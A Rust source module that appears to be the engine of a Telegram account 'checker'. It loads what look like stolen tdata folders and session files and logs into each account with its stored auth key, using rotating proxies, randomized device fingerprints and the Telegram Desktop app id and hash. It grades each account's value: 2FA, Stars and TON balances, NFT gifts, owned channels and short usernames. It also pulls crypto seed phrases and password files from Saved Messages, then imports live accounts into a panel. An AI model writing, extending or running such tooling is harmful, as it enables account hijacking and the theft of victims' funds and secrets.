// checker runner: tdata path collection, zip extraction, main check loop

use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;

use tauri::{AppHandle, Emitter};
use tokio::sync::Semaphore;

use super::analysis;
use super::checks;
use crate::accounts;
use crate::converter::tdata;
use crate::i18n::{t, t_with};
use crate::mtproto;
use crate::proxy;

pub fn is_tdata_folder(dir: &Path) -> bool {
    for suffix in &["key_datas", "key_data1", "key_data0"] {
        if dir.join(suffix).exists() {
            return true;
        }
    }
    let tdata_sub = dir.join("tdata");
    if tdata_sub.is_dir() {
        for suffix in &["key_datas", "key_data1", "key_data0"] {
            if tdata_sub.join(suffix).exists() {
                return true;
            }
        }
    }
    false
}

pub fn collect_tdata_paths(dir: &Path, out: &mut Vec<PathBuf>) {
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let p = entry.path();
        if p.is_dir() {
            if is_tdata_folder(&p) {
                let tdata_sub = p.join("tdata");
                if tdata_sub.is_dir()
                    && (tdata_sub.join("key_datas").exists()
                        || tdata_sub.join("key_data1").exists())
                {
                    out.push(tdata_sub);
                } else {
                    out.push(p);
                }
            } else {
                collect_tdata_paths(&p, out);
            }
        } else if p.extension().map(|e| e == "session").unwrap_or(false) {
            out.push(p);
        } else if p.extension().map(|e| e == "zip").unwrap_or(false) {
            let stem = p
                .file_stem()
                .unwrap_or_default()
                .to_string_lossy()
                .to_lowercase();
            if stem == "tdata" || stem.starts_with("tdata") {
                let temp_dir = std::env::temp_dir()
                    .join("combine_checker")
                    .join(uuid::Uuid::new_v4().to_string());
                if extract_zip_to(&p, &temp_dir).is_ok() {
                    collect_tdata_paths(&temp_dir, out);
                }
            }
        }
    }
}

pub fn extract_zip_to(zip_path: &Path, dest: &Path) -> Result<(), String> {
    let file = std::fs::File::open(zip_path).map_err(|e| e.to_string())?;
    let file_size = file.metadata().map(|m| m.len()).unwrap_or(0);
    if file_size > 500 * 1024 * 1024 {
        return Err("zip too large".into());
    }
    let mut archive = zip::ZipArchive::new(file).map_err(|e| e.to_string())?;
    let mut total_extracted = 0u64;
    for i in 0..archive.len() {
        let mut entry = archive.by_index(i).map_err(|e| e.to_string())?;
        if total_extracted > 1024 * 1024 * 1024 {
            return Err("protection stopped extraction: extracted >1GB".into());
        }
        let out_path = dest.join(entry.mangled_name());
        if entry.is_dir() {
            std::fs::create_dir_all(&out_path).ok();
        } else {
            if let Some(parent) = out_path.parent() {
                std::fs::create_dir_all(parent).ok();
            }
            let mut out_file = std::fs::File::create(&out_path).map_err(|e| e.to_string())?;
            let written = std::io::copy(&mut entry, &mut out_file).map_err(|e| e.to_string())?;
            total_extracted += written;
        }
    }
    Ok(())
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
#[allow(dead_code)]
pub struct CheckerOptions {
    pub valid: bool,
    pub two_fa: bool,
    pub stars: bool,
    pub channels: bool,
    pub channels_min: u32,
    pub groups: bool,
    pub groups_min: u32,
    pub short_tag: bool,
    pub short_channel_tag: bool,
    pub nft_gifts: bool,
    pub premium: bool,
    pub crypto_bots: bool,
    pub seed_phrases: bool,
    pub pass_files: bool,
    pub channel_count: bool,
    pub phone888: bool,
    pub nft_tags: bool,
    pub short_id: bool,
    pub reg_date: bool,
    #[serde(default)]
    pub channel_balances: bool,
    pub add_to_panel: bool,
    pub parse_aging: bool,
    #[serde(default = "default_checker_threads")]
    pub threads: u32,
}

fn default_checker_threads() -> u32 {
    5
}

struct CheckerEntry {
    auth_key: Vec<u8>,
    dc_id: i32,
    source_path: PathBuf,
    is_session_file: bool,
}

pub async fn run_checker(folders: Vec<String>, options: CheckerOptions, app: AppHandle) {
    let emit = |msg: String| {
        let _ = app.emit("checker-log", msg);
    };

    let mut tdata_paths = Vec::new();
    for folder in &folders {
        collect_tdata_paths(Path::new(folder), &mut tdata_paths);
    }

    emit(t_with(
        "checker_checking_accounts",
        &[("count", &tdata_paths.len().to_string())],
    ));

    if tdata_paths.is_empty() {
        emit(t("checker_no_accounts"));
        let _ = app.emit("checker-done", "0/0");
        return;
    }

    let proxy_list = Arc::new(proxy::ProxyList::load());
    let concurrency = options.threads.max(1).min(100) as usize;
    let valid_count = Arc::new(AtomicU32::new(0));
    let invalid_count = Arc::new(AtomicU32::new(0));
    let sem = Arc::new(Semaphore::new(concurrency));

    // expand paths into entries
    let mut entries: Vec<CheckerEntry> = Vec::new();
    for tdata_path in &tdata_paths {
        let is_session = tdata_path
            .extension()
            .map(|e| e == "session")
            .unwrap_or(false);
        if is_session {
            // try telethon first, then pyrogram
            let result = accounts::session::TelethonSession::from_file(tdata_path)
                .map(|s| (s.auth_key, s.dc_id))
                .or_else(|_| {
                    crate::converter::pyro::PyroSession::from_file(tdata_path)
                        .map(|s| (s.auth_key, s.dc_id))
                });
            match result {
                Ok((auth_key, dc_id)) => entries.push(CheckerEntry {
                    auth_key,
                    dc_id,
                    source_path: tdata_path.clone(),
                    is_session_file: true,
                }),
                Err(e) => {
                    let _ = app.emit(
                        "checker-log",
                        t_with("checker_session_read_error", &[("error", &e)]),
                    );
                    invalid_count.fetch_add(1, Ordering::Relaxed);
                    let _ = app.emit("checker-stats", "invalid");
                }
            }
        } else {
            match tdata::parse_tdata(tdata_path) {
                Ok(accs) => {
                    if accs.is_empty() {
                        let _ = app.emit(
                            "checker-log",
                            t_with(
                                "checker_no_accounts_in_tdata",
                                &[("path", &format!("{:?}", tdata_path))],
                            ),
                        );
                        invalid_count.fetch_add(1, Ordering::Relaxed);
                        let _ = app.emit("checker-stats", "invalid");
                    } else {
                        if accs.len() > 1 {
                            let _ = app.emit(
                                "checker-log",
                                t_with(
                                    "checker_multi_account_tdata",
                                    &[
                                        ("count", &accs.len().to_string()),
                                        ("path", &format!("{:?}", tdata_path)),
                                    ],
                                ),
                            );
                        }
                        for acc in accs {
                            entries.push(CheckerEntry {
                                auth_key: acc.auth_key,
                                dc_id: acc.dc_id,
                                source_path: tdata_path.clone(),
                                is_session_file: false,
                            });
                        }
                    }
                }
                Err(e) => {
                    if e == "local_passcode" {
                        let _ = app.emit(
                            "checker-log",
                            t_with(
                                "checker_local_passcode",
                                &[("path", &format!("{:?}", tdata_path))],
                            ),
                        );
                    } else {
                        let _ = app.emit(
                            "checker-log",
                            t_with("checker_parse_error", &[("error", &e)]),
                        );
                    }
                    invalid_count.fetch_add(1, Ordering::Relaxed);
                    let _ = app.emit("checker-stats", "invalid");
                }
            }
        }
    }

    // dedup
    let mut seen_keys: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();
    entries.retain(|e| seen_keys.insert(e.auth_key.clone()));

    let total_entries = entries.len();
    let mut handles = Vec::new();

    for (i, entry) in entries.into_iter().enumerate() {
        let sem = sem.clone();
        let app = app.clone();
        let valid_count = valid_count.clone();
        let invalid_count = invalid_count.clone();
        let proxy_list = proxy_list.clone();
        let tdata_path = entry.source_path;
        let auth_key_vec = entry.auth_key;
        let dc_id = entry.dc_id;
        let is_session_file = entry.is_session_file;
        let opts_channels = options.channels;
        let opts_groups = options.groups;
        let opts_channel_count = options.channel_count;
        let opts_crypto_bots = options.crypto_bots;
        let opts_channels_min = options.channels_min;
        let opts_groups_min = options.groups_min;
        let opts_two_fa = options.two_fa;
        let opts_stars = options.stars;
        let opts_nft_gifts = options.nft_gifts;
        let opts_short_tag = options.short_tag;
        let opts_short_channel_tag = options.short_channel_tag;
        let opts_short_id = options.short_id;
        let opts_phone888 = options.phone888;
        let opts_nft_tags = options.nft_tags;
        let opts_seed_phrases = options.seed_phrases;
        let opts_pass_files = options.pass_files;
        let opts_reg_date = options.reg_date;
        let opts_channel_balances = options.channel_balances;
        let opts_add_to_panel = options.add_to_panel;
        let _opts_parse_aging = options.parse_aging;
        let idx = i + 1;
        let total = total_entries;

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let emit_line = |msg: String| { let _ = app.emit("checker-log", msg); };

            emit_line(t_with("checker_checking_progress", &[("idx", &idx.to_string()), ("total", &total.to_string())]));

            let proxy = proxy_list.get_random().cloned();

            let dc_addr = match dc_id {
                1 => "149.154.175.53:443",
                2 => "149.154.167.51:443",
                3 => "149.154.175.100:443",
                4 => "149.154.167.91:443",
                5 => "91.108.56.130:443",
                _ => "149.154.167.51:443",
            };

            let mut auth_key = [0u8; 256];
            if auth_key_vec.len() != 256 {
                emit_line(t("checker_authkey_invalid_size"));
                invalid_count.fetch_add(1, Ordering::Relaxed);
                let _ = app.emit("checker-stats", "invalid");
                return;
            }
            auth_key.copy_from_slice(&auth_key_vec);

            let mut client = {
                let delays: [u64; 5] = [0, 300, 500, 1500, 1500];
                let mut connected = None;
                let mut last_err = String::new();
                for attempt in 0..5 {
                    if attempt > 0 {
                        tokio::time::sleep(std::time::Duration::from_millis(delays[attempt])).await;
                    }
                    match mtproto::client::MtpClient::connect(dc_addr, &auth_key, proxy.as_ref()).await {
                        Ok(c) => { connected = Some(c); break; }
                        Err(e) => { last_err = e; }
                    }
                }
                match connected {
                    Some(c) => c,
                    None => {
                        emit_line(t_with("checker_connect_error", &[("error", &last_err)]));
                        invalid_count.fetch_add(1, Ordering::Relaxed);
                        let _ = app.emit("checker-stats", "invalid");
                        return;
                    }
                }
            };

            let dev = accounts::devices::generate_random_device();
            let user = match client.get_me(2040, &dev.device, &dev.sdk, &dev.app_version, "en", "en").await {
                Ok(u) => u,
                Err(e) => {
                    emit_line(t_with("checker_invalid", &[("error", &e)]));
                    invalid_count.fetch_add(1, Ordering::Relaxed);
                    let _ = app.emit("checker-stats", "invalid");
                    return;
                }
            };

            valid_count.fetch_add(1, Ordering::Relaxed);
            let _ = app.emit("checker-stats", "valid");
            let mut info_parts = vec![t_with("checker_valid", &[("id", &user.id.to_string())])];

            info_parts.push(if !user.username.is_empty() { format!("@{}", user.username) } else { "tag=none".to_string() });
            info_parts.push(if user.premium { "premium=true".to_string() } else { "premium=false".to_string() });
            if !user.phone.is_empty() { info_parts.push(format!("+{}", user.phone)); }

            let mut acc_has_2fa = false;
            let mut acc_stars: i64 = 0;
            let mut acc_premium_until: Option<i64> = None;
            let mut acc_channels: Vec<serde_json::Value> = Vec::new();
            let mut acc_groups: Vec<serde_json::Value> = Vec::new();
            let mut acc_channel_balances: Vec<serde_json::Value> = Vec::new();
            let mut acc_nft_gifts: Vec<String> = Vec::new();
            let mut acc_nft_tags: Vec<String> = Vec::new();
            let acc_phone888 = user.phone.starts_with("888");
            let mut acc_reg_date: Option<String> = None;
            let mut acc_seed_found = false;
            let mut acc_seed_text = String::new();
            let mut acc_pass_files: Vec<String> = Vec::new();
            let mut acc_pass_file_paths: Vec<String> = Vec::new();
            let mut acc_short_tag: Option<String> = None;
            let acc_short_id = user.id < 10_000_000;
            let mut acc_crypto_send = false;
            let mut acc_crypto_xrocket = false;
            let mut acc_subscriptions: u32 = 0;

            if opts_short_tag {
                if !user.username.is_empty() && user.username.len() < 5 {
                    info_parts.push(format!("SHORT_TAG(@{})", user.username));
                    acc_short_tag = Some(format!("@{}", user.username));
                } else {
                    info_parts.push("short_tag=false".to_string());
                }
            }
            if opts_short_id {
                info_parts.push(if acc_short_id { "SHORT_ID=true".to_string() } else { "short_id=false".to_string() });
            }
            if opts_phone888 {
                info_parts.push(if acc_phone888 { "+888=true".to_string() } else { "+888=false".to_string() });
            }
            if opts_nft_tags {
                let nft_tags: Vec<&String> = user.nft_usernames.iter()
                    .filter(|u| u.as_str() != user.username)
                    .collect();
                if !nft_tags.is_empty() {
                    info_parts.push(format!("NFT_TAGS={}", nft_tags.len()));
                    for tag in &nft_tags {
                        emit_line(t_with("checker_nft_tag", &[("tag", tag.as_str())]));
                        acc_nft_tags.push(format!("@{}", tag));
                    }
                } else {
                    info_parts.push("nft_tags=none".to_string());
                }
            }

            if opts_two_fa {
                match checks::check_2fa(&mut client).await {
                    Ok(true) => { info_parts.push("2FA=true".to_string()); acc_has_2fa = true; }
                    Ok(false) => info_parts.push("2FA=false".to_string()),
                    Err(_) => info_parts.push("2FA=err".to_string()),
                }
            }
            if opts_stars {
                match checks::get_stars_balance(&mut client).await {
                    Ok(balance) => { info_parts.push(format!("STARS={}", balance)); acc_stars = balance; }
                    Err(_) => info_parts.push("STARS=err".to_string()),
                }
            }
            if user.premium {
                match checks::get_premium_until(&mut client).await {
                    Ok(Some(ts)) => {
                        acc_premium_until = Some(ts);
                        let dt = analysis::chrono_format_ts(ts);
                        info_parts.push(format!("PREM_UNTIL={}", dt));
                    }
                    Ok(None) => {}
                    Err(_) => {}
                }
            }
            if opts_nft_gifts {
                match checks::get_saved_gifts(&mut client).await {
                    Ok((total_gifts, nft_links)) => {
                        info_parts.push(format!("GIFTS={}", total_gifts));
                        if !nft_links.is_empty() {
                            info_parts.push(format!("NFT={}", nft_links.len()));
                            for link in &nft_links { emit_line(format!("    NFT: {}", link)); }
                            acc_nft_gifts = nft_links;
                        }
                    }
                    Err(_) => info_parts.push("GIFTS=err".to_string()),
                }
            }

            if opts_channels || opts_groups || opts_channel_count || opts_crypto_bots || opts_short_channel_tag || opts_channel_balances {
                match checks::get_dialog_stats(&mut client).await {
                    Ok(ds) => {
                        if opts_channel_count {
                            acc_subscriptions = ds.subscribed_channels + ds.subscribed_groups + ds.total_dialogs;
                            info_parts.push(format!("SUBS={}", acc_subscriptions));
                        }
                        if opts_crypto_bots {
                            acc_crypto_send = ds.has_send_bot;
                            acc_crypto_xrocket = ds.has_xrocket_bot;
                            info_parts.push(format!("@send={} @xrocket={}", ds.has_send_bot, ds.has_xrocket_bot));
                        }
                        if opts_channels {
                            let big: Vec<_> = ds.owned_channels.iter().filter(|c| c.is_broadcast && c.participants_count >= opts_channels_min).collect();
                            info_parts.push(format!("CHANNELS={}", big.len()));
                            for ch in &big {
                                emit_line(t_with("checker_channel", &[("title", &ch.title), ("count", &ch.participants_count.to_string())]));
                                acc_channels.push(serde_json::json!({"title": ch.title, "subscribers": ch.participants_count}));
                            }
                        }
                        if opts_short_channel_tag {
                            let short_chs: Vec<_> = ds.owned_channels.iter()
                                .filter(|c| c.is_broadcast && !c.username.is_empty() && c.username.len() < 5)
                                .collect();
                            info_parts.push(format!("SHORT_CH_TAG={}", short_chs.len()));
                            for ch in &short_chs {
                                emit_line(t_with("checker_short_channel_tag", &[("username", &ch.username), ("title", &ch.title)]));
                            }
                        }
                        if opts_groups {
                            let big: Vec<_> = ds.owned_groups.iter().filter(|c| c.participants_count >= opts_groups_min).collect();
                            info_parts.push(format!("GROUPS={}", big.len()));
                            for gr in &big {
                                emit_line(t_with("checker_group", &[("title", &gr.title), ("count", &gr.participants_count.to_string())]));
                                acc_groups.push(serde_json::json!({"title": gr.title, "members": gr.participants_count}));
                            }
                        }
                        if opts_channel_balances {
                            let all_peers: Vec<_> = ds.owned_channels.iter().chain(ds.owned_groups.iter()).collect();
                            for peer in &all_peers {
                                let kind_label = if peer.is_broadcast { t("reporter_target_channel") } else { t("global_search_mode_groups") };
                                let stars = checks::get_peer_stars_balance(&mut client, peer.channel_id, peer.access_hash).await.unwrap_or(0);
                                let ton = checks::get_peer_ton_balance(&mut client, peer.channel_id, peer.access_hash).await.unwrap_or(0);
                                if stars > 0 || ton > 0 {
                                    emit_line(t_with("checker_channel_balance", &[("kind", &kind_label), ("title", &peer.title), ("stars", &stars.to_string()), ("ton", &ton.to_string())]));
                                    acc_channel_balances.push(serde_json::json!({
                                        "title": peer.title,
                                        "type": if peer.is_broadcast { "channel" } else { "group" },
                                        "stars": stars,
                                        "ton": ton,
                                    }));
                                }
                            }
                            let total_stars: i64 = acc_channel_balances.iter().map(|b| b["stars"].as_i64().unwrap_or(0)).sum();
                            let total_ton: i64 = acc_channel_balances.iter().map(|b| b["ton"].as_i64().unwrap_or(0)).sum();
                            info_parts.push(format!("CH_STARS={} CH_TON={}", total_stars, total_ton));
                        }
                    }
                    Err(_) => info_parts.push("dialogs=err".to_string()),
                }
            }

            if opts_seed_phrases || opts_pass_files {
                match checks::get_saved_messages(&mut client, 200).await {
                    Ok(messages) => {
                        if opts_seed_phrases {
                            let found = messages.iter().any(|m| analysis::is_seed_phrase(&m.text));
                            info_parts.push(format!("SEED={}", found));
                            acc_seed_found = found;
                            if found {
                                if let Some(msg) = messages.iter().find(|m| analysis::is_seed_phrase(&m.text)) {
                                    acc_seed_text = msg.text.clone();
                                    emit_line(t_with("checker_seed", &[("text", &acc_seed_text)]));
                                }
                            }
                        }
                        if opts_pass_files {
                            let pass_names = ["pass.txt", "seed.txt", "seeds.txt", "password.txt", "passwords.txt"];
                            for m in &messages {
                                let lower = m.text.to_lowercase();
                                for pn in &pass_names {
                                    if lower.contains(pn) && m.text.len() < 100 {
                                        if !acc_pass_files.contains(&pn.to_string()) {
                                            acc_pass_files.push(pn.to_string());
                                        }
                                    }
                                }
                            }
                            for m in &messages {
                                if let Some(ref doc) = m.document {
                                    let doc_lower = doc.filename.to_lowercase();
                                    if pass_names.iter().any(|pn| doc_lower == *pn) {
                                        if !acc_pass_files.contains(&doc.filename) {
                                            acc_pass_files.push(doc.filename.clone());
                                        }
                                        let temp_dir = std::env::temp_dir()
                                            .join("combine_checker")
                                            .join("pass_files");
                                        std::fs::create_dir_all(&temp_dir).ok();
                                        let dest_file = temp_dir.join(format!("{}_{}", user.id, doc.filename));
                                        match checks::download_document(&mut client, doc).await {
                                            Ok(data) => {
                                                if std::fs::write(&dest_file, &data).is_ok() {
                                                    emit_line(t_with("checker_downloaded", &[("path", &dest_file.display().to_string())]));
                                                    acc_pass_file_paths.push(dest_file.to_string_lossy().to_string());
                                                }
                                            }
                                            Err(e) => {
                                                emit_line(t_with("checker_download_error", &[("filename", &doc.filename), ("error", &e)]));
                                            }
                                        }
                                    }
                                }
                            }
                            let found = !acc_pass_files.is_empty();
                            info_parts.push(format!("PASS_FILE={}", found));
                        }
                    }
                    Err(_) => {
                        if opts_seed_phrases { info_parts.push("SEED=err".to_string()); }
                        if opts_pass_files { info_parts.push("PASS_FILE=err".to_string()); }
                    }
                }
            }

            if opts_reg_date {
                let ts = crate::accounts::aging::estimate_registration_ts(user.id);
                if ts > 0 {
                    let date_str = crate::checker::analysis::chrono_format_ts(ts);
                    info_parts.push(format!("REG={}", date_str));
                    acc_reg_date = Some(date_str);
                } else {
                    info_parts.push("REG=none".to_string());
                }
            }

            let spamblock_status = match checks::check_spambot(&mut client).await {
                Ok(s) => s,
                Err(_) => "none".to_string(),
            };
            let acc_spamblock = if spamblock_status == crate::i18n::t("status_clean") {
                "none".to_string()
            } else if spamblock_status.starts_with(&crate::i18n::t("status_geo_spam")) {
                "temp_geo".to_string()
            } else if spamblock_status == crate::i18n::t("status_perm_spam") {
                "perm".to_string()
            } else if spamblock_status == crate::i18n::t("status_frozen") {
                "frozen".to_string()
            } else {
                "none".to_string()
            };

            let _ = app.emit("checker-account", serde_json::json!({
                "id": user.id,
                "username": user.username,
                "phone": user.phone,
                "premium": user.premium,
                "premium_until": acc_premium_until,
                "has_2fa": acc_has_2fa,
                "stars": acc_stars,
                "spamblock": acc_spamblock,
                "channels": acc_channels,
                "groups": acc_groups,
                "nft_gifts": acc_nft_gifts,
                "nft_tags": acc_nft_tags,
                "phone888": acc_phone888,
                "reg_date": acc_reg_date,
                "seed_found": acc_seed_found,
                "seed_text": acc_seed_text,
                "pass_files": acc_pass_files,
                "pass_file_paths": acc_pass_file_paths,
                "short_tag": acc_short_tag,
                "short_id": acc_short_id,
                "crypto_bots": {"send": acc_crypto_send, "xrocket": acc_crypto_xrocket},
                "subscriptions": acc_subscriptions,
                "channel_balances": acc_channel_balances,
                "source_path": tdata_path.to_string_lossy().to_string()
            }));

            if opts_add_to_panel {
                let storage = accounts::commands::get_storage_pub();
                let account_id = format!("checker_{}", user.id);
                let session_path = storage.session_path(&account_id);
                let json_path = storage.json_path(&account_id);

                // dedup by auth_key
                let existing = accounts::commands::collect_existing_auth_keys_pub(&storage);
                let is_dupe = existing.contains(&auth_key_vec);

                if !is_dupe && !session_path.exists() {
                    let session = accounts::session::TelethonSession {
                        dc_id: dc_id,
                        auth_key: auth_key_vec.clone(),
                        port: 443,
                        server_address: dc_addr.split(':').next().unwrap_or("149.154.167.51").to_string(),
                    };
                    if session.to_file(&session_path).is_ok() {
                        let reg_timestamp = crate::accounts::aging::estimate_registration_ts(user.id);

                        let json = accounts::session::AccountJson {
                            app_id: 2040,
                            app_hash: "b18441a1ff607e10a989891a5462e627".to_string(),
                            phone: user.phone.clone(),
                            first_name: user.first_name.clone(),
                            last_name: user.last_name.clone(),
                            username: user.username.clone(),
                            user_id: user.id,
                            is_premium: user.premium,
                            validated: true,
                            valid: true,
                            status: spamblock_status.clone(),
                            role: if user.premium { t("checker_role_premium") } else { t("checker_role_default") },
                            register_time: reg_timestamp,
                            proxy: proxy.as_ref().map(|p| p.to_string_repr()),
                            ..Default::default()
                        };
                        let _ = json.to_file(&json_path);
                        if !is_session_file {
                            let tdata_dest = storage.tdata_dir(&account_id);
                            if !tdata_dest.exists() {
                                let _ = crate::accounts::commands::copy_dir_recursive(&tdata_path, &tdata_dest);
                            }
                        }
                        emit_line(t_with("checker_added_to_panel", &[("id", &account_id)]));
                    }
                }
            }

            emit_line(format!("  {}", info_parts.join(" | ")));
        }));
    }

    for h in handles {
        let _ = h.await;
    }

    let v = valid_count.load(Ordering::Relaxed);
    let inv = invalid_count.load(Ordering::Relaxed);
    let _ = app.emit(
        "checker-log",
        t_with(
            "checker_summary",
            &[("valid", &v.to_string()), ("invalid", &inv.to_string())],
        ),
    );
    let _ = app.emit("checker-done", format!("{}/{}", v, inv));
}
